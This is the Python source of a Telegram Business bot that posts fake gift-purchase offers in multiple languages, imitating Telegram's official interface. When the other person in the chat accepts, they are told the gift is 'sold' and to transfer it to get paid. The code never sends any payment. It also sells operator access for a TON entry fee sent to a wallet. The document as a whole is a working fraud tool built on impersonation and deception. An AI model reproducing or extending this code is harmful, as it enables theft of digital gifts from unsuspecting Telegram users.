"""Telegram Business assistant for non-official gift proposals.
Команда: 'купить ЦЕНА [eng|kit|arb]' -> Бот отправляет оффер.
Плюс: система входа (ENTRY_PRICE TON), заявки админу, доступ только у одобренных.
"""

import asyncio
import html
import json
import logging
import os
import re
import secrets
import time
from dataclasses import dataclass

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)
try:
    from aiogram.exceptions import TelegramRetryAfter
except ImportError:
    try:
        from aiogram.exceptions import TelegramFloodWait as TelegramRetryAfter
    except ImportError:
        class TelegramRetryAfter(Exception):
            def __init__(self, message): self.message = message
            @property
            def retry_after(self): return 60

from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN", "")
TTL_HOURS = int(os.getenv("OFFER_TTL_HOURS", "5"))

ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))
TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")

# Резервный получатель, если у покупателя нет юзернейма
GIFT_RECIPIENT = "mindly_offer" 

router = Router()
COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'

LANG_TOKENS = {
    "eng": "en",
    "kit": "zh",
    "arb": "ar",
}

def detect_lang(payload: str) -> str:
    for token in payload.lower().split():
        if token in LANG_TOKENS:
            return LANG_TOKENS[token]
    return "ru"

SEND_COOLDOWN_SECONDS = 2.0
_last_send_time: float = 0.0
_send_lock = asyncio.Lock()

def load_allowed_users() -> set[int]:
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return {int(x) for x in json.load(f)}
    except Exception:
        return set()

def save_allowed_users() -> None:
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(allowed_users), f)
    except Exception:
        logging.exception("Не удалось сохранить список пользователей")

allowed_users: set[int] = load_allowed_users()
entry_pending: set[int] = set()

def user_info_line(user) -> str:
    uname = f"@{user.username}" if getattr(user, "username", None) else "нет"
    return (
        f"ID: <code>{user.id}</code>\n"
        f"Имя: {html.escape(user.full_name)}\n"
        f"Username: {uname}"
    )

def admin_decision_kb(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Добавить", callback_data=f"admin:allow:{user_id}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin:deny:{user_id}"),
    ]])

def is_peer_flood(e: Exception) -> bool:
    return "PEER_FLOOD" in str(e).upper()

async def send_cooldown() -> None:
    global _last_send_time
    async with _send_lock:
        now = time.monotonic()
        elapsed = now - _last_send_time
        if elapsed < SEND_COOLDOWN_SECONDS:
            await asyncio.sleep(SEND_COOLDOWN_SECONDS - elapsed)
        _last_send_time = time.monotonic()

@dataclass
class Offer:
    id: str
    connection_id: str
    chat_id: int
    message_id: int
    buyer_id: int
    buyer_name: str
    price: str
    currency: str
    lang: str = "ru"
    buyer_username: str = ""

offers: dict[str, Offer] = {}

async def safe_send_message_text(
    bot: Bot, text: str, chat_id: int,
    business_connection_id: str,
    reply_markup: InlineKeyboardMarkup,
    link_preview_options: LinkPreviewOptions
) -> Message:
    await send_cooldown()
    try:
        return await bot.send_message(
            chat_id=chat_id, text=text,
            business_connection_id=business_connection_id,
            reply_markup=reply_markup, link_preview_options=link_preview_options
        )
    except TelegramRetryAfter as e:
        if is_peer_flood(e):
            raise
        wait_time = getattr(e, "retry_after", 30)
        logging.info(f"FLOOD_WAIT {wait_time}s — один ретрай.")
        await asyncio.sleep(wait_time)
        return await bot.send_message(
            chat_id=chat_id, text=text,
            business_connection_id=business_connection_id,
            reply_markup=reply_markup, link_preview_options=link_preview_options
        )

async def safe_edit_message_text(
    bot: Bot, text: str, chat_id: int, message_id: int,
    business_connection_id: str | None = None,
    reply_markup: InlineKeyboardMarkup | None = None,
    link_preview_options: LinkPreviewOptions | None = None
) -> None:
    if link_preview_options is None:
        link_preview_options = LinkPreviewOptions(is_disabled=True)
    max_retries = 3
    for attempt in range(max_retries):
        try:
            await bot.edit_message_text(
                text=text, chat_id=chat_id, message_id=message_id,
                business_connection_id=business_connection_id,
                reply_markup=reply_markup, link_preview_options=link_preview_options
            )
            return
        except TelegramRetryAfter as e:
            if is_peer_flood(e):
                raise
            wait_time = getattr(e, "retry_after", 60)
            if attempt == max_retries - 1:
                raise
            logging.info(f"Edit FLOOD_WAIT ({wait_time}s).")
            await asyncio.sleep(wait_time)
        except Exception as e:
            logging.debug(f"Edit failed: {e}")
            if attempt == max_retries - 1:
                raise
            await asyncio.sleep(1)

def parse_price(payload: str) -> str | None:
    parts = payload.split()
    for part in parts:
        try:
            raw = part.replace(",", ".").lower()
            if raw.replace(".", "").isdigit():
                price_val = float(raw)
                if 0 < price_val < 10000000:
                    formatted = f"{int(price_val) if int(price_val) == price_val else price_val:f}"
                    return formatted.rstrip('0').rstrip('.')
        except ValueError:
            pass
    return None

def offer_text(offer: Offer) -> str:
    name = html.escape(offer.buyer_name)
    price, cur, ttl = offer.price, offer.currency, TTL_HOURS
    nbsp = "\u00A0"

    if offer.lang == "en":
        return f"User <b>{name}</b> offers you\n<b>{price} {cur}</b> for the gift\n\n<b>The offer is valid for another {ttl}h 59m.</b>"
    if offer.lang == "zh":
        return f"用户 <b>{name}</b> 向您出价\n<b>{price} {cur}</b> 购买这份礼物\n\n<b>报价有效期还剩 {ttl}小时59分钟。</b>"
    if offer.lang == "ar":
        return f"المستخدم <b>{name}</b> يعرض عليك\n<b>{price} {cur}</b> مقابل الهدية\n\n<b>العرض صالح لمدة {ttl} س و 59 د أخرى.</b>"
    
    # Русский (оригинальный текст)
    return (
        f"Пользователь <b>{name}</b> предлагает\n"
        f"Вам <b>{price} {cur}</b> за подарок\n\n"
        f"Предложение действует ещё <b>{ttl}{nbsp}ч.{nbsp}59{nbsp}м.</b>"
    )

def decline_text(offer: Offer) -> str:
    return {"en": "❌ Offer declined", "zh": "❌ 报价已被拒绝", "ar": "❌ تم رفض العرض"}.get(offer.lang, "❌ Предложение отклонено")

def sold_text(offer: Offer) -> str:
    cur = offer.currency
    if offer.lang == "en": return f"{GIFT_EMOJI_HTML} The gift has been sold!\n\n• Transfer the gift to the buyer to credit {cur}."
    if offer.lang == "zh": return f"{GIFT_EMOJI_HTML} 礼物已成功售出！\n\n• 请将礼物转给买家以入账 {cur}。"
    if offer.lang == "ar": return f"{GIFT_EMOJI_HTML} تم بيع الهدية بنجاح!\n\n• قم بتحويل الهدية للمشتري ليتم إضافة {cur}."
    return f"{GIFT_EMOJI_HTML} Подарок успешно продан!\n\n• Передайте подарок покупателю для зачисления {cur}."

def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    transfer_label = {"en": "Transfer", "zh": "转赠", "ar": "إرسال"}.get(offer.lang, "Передать")
    
    # Проверяем, есть ли реальный юзернейм (латиница). Если нет, ставим mindly_offer, чтобы не было ошибки URL.
    recipient = offer.buyer_username if (offer.buyer_username and not offer.buyer_username.isdigit()) else GIFT_RECIPIENT
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=transfer_label, url=f"tg://send_gift?to={recipient}")],
    ])

def proposal_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    accept_label, decline_label = {"en": ("✓ Accept", "✕ Decline"), "zh": ("✓ 接受", "✕ 拒绝"), "ar": ("✓ قبول", "✕ رفض")}.get(offer.lang, ("✓ Принять", "✕ Отклонить"))
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=decline_label, callback_data=f"decline:{offer.id}"),
        InlineKeyboardButton(text=accept_label, callback_data=f"accept:{offer.id}"),
    ]])

def accept_alert_text(offer: Offer) -> str:
    buyer = offer.buyer_name[:30] + "..." if len(offer.buyer_name) > 30 else offer.buyer_name
    cur = "звезд" if offer.currency == "Stars" else offer.currency

    if offer.lang == "en": return f"Offer to sell the gift successfully accepted.\n\nTransfer the gift to {buyer} to receive {offer.price} {offer.currency}."
    if offer.lang == "zh": return f"出售礼物的报价已成功接受。\n\n请将礼物转给 {buyer} 以将 {offer.price} {offer.currency} 存入余额。"
    if offer.lang == "ar": return f"تم قبول عرض بيع الهدية.\n\nقم بتحويل الهدية إلى {buyer} لإضافة {offer.price} {offer.currency} إلى رصيدك."
    
    return f"Предложение о продаже подарка успешно принято.\n\nПередайте подарок {buyer} для зачисления {offer.price} {cur} на ваш баланс."

@router.message(CommandStart(), F.chat.type == "private")
async def cmd_start(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user: return
    if user.id == ADMIN_ID or user.id in allowed_users:
        await message.answer("Привет! 👋\n\nУ вас уже есть доступ к офферам ✅\nПишите в чат с бизнесом команду: <code>купить ЦЕНА</code>")
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔑 Купить вход", callback_data="entry:start")]])
    await message.answer(f"Привет! Это бот по офферам 🎁\n\nВход стоит <b>{ENTRY_PRICE} TON</b>.", reply_markup=kb)

@router.callback_query(F.data == "entry:start")
async def entry_start(callback: CallbackQuery, bot: Bot) -> None:
    user = callback.from_user
    if user.id == ADMIN_ID or user.id in allowed_users:
        await callback.answer("У вас уже есть доступ ✅")
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Я оплатил", callback_data="entry:paid")], [InlineKeyboardButton(text="⬅️ Назад", callback_data="entry:back")]])
    await callback.message.edit_text(f"💳 Оплата входа <b>{ENTRY_PRICE} TON</b>\n\nАдрес: <code>{html.escape(TON_WALLET)}</code>", reply_markup=kb)
    await callback.answer()

@router.callback_query(F.data == "entry:back")
async def entry_back(callback: CallbackQuery, bot: Bot) -> None:
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔑 Купить вход", callback_data="entry:start")]])
    await callback.message.edit_text(f"Привет! Это бот по офферам 🎁\n\nВход стоит <b>{ENTRY_PRICE} TON</b>.", reply_markup=kb)
    await callback.answer()

@router.callback_query(F.data == "entry:paid")
async def entry_paid(callback: CallbackQuery, bot: Bot) -> None:
    user = callback.from_user
    if user.id == ADMIN_ID or user.id in allowed_users:
        await callback.answer("У вас уже есть доступ ✅")
        return
    entry_pending.add(user.id)
    await callback.message.edit_text("📸 Пришлите <b>скриншот перевода</b>.")
    try:
        await bot.send_message(ADMIN_ID, f"🔔 <b>Заявка на вход</b>\n\n{user_info_line(user)}", reply_markup=admin_decision_kb(user.id))
    except Exception: pass
    await callback.answer("Заявка отправлена ✅")

@router.message((F.photo | F.document), F.chat.type == "private")
async def on_screenshot(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user or (user.id != ADMIN_ID and user.id not in entry_pending): return
    entry_pending.discard(user.id)
    try:
        await message.copy_to(ADMIN_ID, caption=f"📸 <b>Скриншот оплаты</b>\n\n{user_info_line(user)}", reply_markup=admin_decision_kb(user.id))
        await message.answer("Скриншот отправлен ✅")
    except Exception: pass

@router.message(Command("ledgerteam"), F.chat.type == "private")
async def cmd_ledgerteam(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user or user.id == ADMIN_ID or user.id in allowed_users: return
    try:
        await bot.send_message(ADMIN_ID, f"🚀 <b>Заявка</b>\n\n{user_info_line(user)}", reply_markup=admin_decision_kb(user.id))
        await message.answer("Заявка отправлена ✅")
    except Exception: pass

@router.callback_query(F.data.startswith(("admin:allow:", "admin:deny:")))
async def admin_decision(callback: CallbackQuery, bot: Bot) -> None:
    if callback.from_user.id != ADMIN_ID: return
    try:
        _, action, raw_id = callback.data.split(":")
        user_id = int(raw_id)
    except Exception: return
    if action == "allow":
        allowed_users.add(user_id)
        save_allowed_users()
        entry_pending.discard(user_id)
        try: await bot.send_message(user_id, "✅ <b>Вам выдан доступ!</b>")
        except Exception: pass
        if callback.message: await callback.message.edit_text(callback.message.html_text + "\n\n— ✅ <b>Добавлен</b>")
    else:
        entry_pending.discard(user_id)
        try: await bot.send_message(user_id, "❌ Отклонено.")
        except Exception: pass
        if callback.message: await callback.message.edit_text(callback.message.html_text + "\n\n— ❌ <b>Отклонено</b>")
    await callback.answer("Готово.")

@router.message(Command("grant"), F.chat.type == "private")
async def cmd_grant(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID: return
    try: user_id = int(message.text.split()[1])
    except Exception: return
    allowed_users.add(user_id)
    save_allowed_users()
    await message.answer(f"✅ Доступ выдан.")

@router.message(Command("revoke"), F.chat.type == "private")
async def cmd_revoke(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID: return
    try: user_id = int(message.text.split()[1])
    except Exception: return
    allowed_users.discard(user_id)
    save_allowed_users()
    await message.answer(f"🚫 Доступ удалён.")

@router.message(Command("users"), F.chat.type == "private")
async def cmd_users(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👥 <b>Список:</b>\n" + "\n".join(f"• <code>{u}</code>" for u in sorted(allowed_users)))

@router.business_message(F.text)
async def create_offer(message: Message, bot: Bot) -> None:
    if not message.text or not message.business_connection_id: return
    match = COMMAND_REGEX.fullmatch(message.text.strip())
    if not match: return
    
    payload = match.group(1).strip()
    lang = detect_lang(payload)
    price = parse_price(payload)
    if price is None:
        await message.answer("Укажите цену! Пример: купить 100", quote=False)
        return

    currency = "TON" if any(w in payload.lower() for w in ("gram", "грам", "тон", "тн", "ton", "toncoin")) else "Stars"

    try:
        connection = await bot.get_business_connection(message.business_connection_id)
        buyer = connection.user
        buyer_id = buyer.id

        if buyer_id != ADMIN_ID and buyer_id not in allowed_users:
            await message.answer("⛔ Нет доступа.", quote=False)
            return

        buyer_name = f"@{buyer.username}" if getattr(buyer, "username", None) else (buyer.full_name if hasattr(buyer, "full_name") else f"id{buyer.id}")
        buyer_username = buyer.username if buyer.username else str(buyer.id)

        offer_id = secrets.token_urlsafe(8)
        temp_offer = Offer(
            id=offer_id, connection_id=message.business_connection_id,
            chat_id=message.chat.id, message_id=message.message_id,
            buyer_id=buyer_id, buyer_name=buyer_name, price=price,
            currency=currency, lang=lang, buyer_username=buyer_username,
        )

        msg = await safe_send_message_text(bot, offer_text(temp_offer), message.chat.id, message.business_connection_id, proposal_keyboard(temp_offer), LinkPreviewOptions(is_disabled=True))
        temp_offer.message_id = msg.message_id
        offers[offer_id] = temp_offer

        await bot.delete_business_messages(message.business_connection_id, message_ids=[message.message_id])
    except Exception as e:
        logging.exception(f"Error: {e}")

@router.callback_query(F.data.startswith(("accept:", "decline:")))
async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
    action, offer_id = callback.data.split(":", 1)
    offer = offers.get(offer_id)
    if not offer:
        await callback.answer("Оффер не найден.", show_alert=True)
        return

    if action == "decline":
        try:
            await callback.message.edit_text(
                text=decline_text(offer),
                reply_markup=None
            )
        except Exception as e:
            logging.error(f"Ошибка при отклонении: {e}")
            # Фолбэк на всякий случай
            await safe_edit_message_text(bot, decline_text(offer), offer.chat_id, offer.message_id, offer.connection_id, None)
            
        offers.pop(offer_id, None)
        await callback.answer("Отклонено.")
    else:
        text = sold_text(offer)
        kb = sold_keyboard(offer)
        
        try:
            # Самый надежный способ обновить сообщение в бизнес-чате
            await callback.message.edit_text(
                text=text,
                reply_markup=kb
            )
        except Exception as e:
            logging.error(f"Ошибка при редактировании (принятие): {e}")
            # Если вдруг не сработало, пробуем через бота
            try:
                await safe_edit_message_text(
                    bot, text, offer.chat_id, offer.message_id,
                    offer.connection_id, kb
                )
            except Exception as e2:
                logging.error(f"Фолбэк тоже не сработал: {e2}")
        
        offers.pop(offer_id, None)
        
        # Вызываем всплывающее окно. Ограничиваем текст 200 символами, чтобы Telegram не выдал ошибку.
        alert_text = accept_alert_text(offer)
        if len(alert_text) > 200:
            alert_text = alert_text[:197] + "..."
            
        await callback.answer(alert_text, show_alert=True)

async def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")
    bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode="HTML"), timeout=15)
    dp = Dispatcher()
    dp.include_router(router)
    try: await dp.start_polling(bot)
    finally: await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
